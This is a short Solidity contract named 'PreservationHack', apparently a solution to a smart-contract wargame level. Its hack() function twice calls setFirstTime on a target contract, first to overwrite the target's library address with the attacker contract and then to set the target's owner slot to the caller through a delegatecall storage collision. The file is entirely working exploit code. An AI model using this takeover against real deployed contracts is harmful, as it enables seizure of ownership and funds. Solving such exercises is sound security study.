// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract PreservationHack {
    address public var1;
    address public var2;
    address public owner;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function hack() external {
        IPreservation(target).setFirstTime(uint256(uint160(address(this))));
        IPreservation(target).setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint _time) external {
        owner = address(uint160(_time));
    }
}
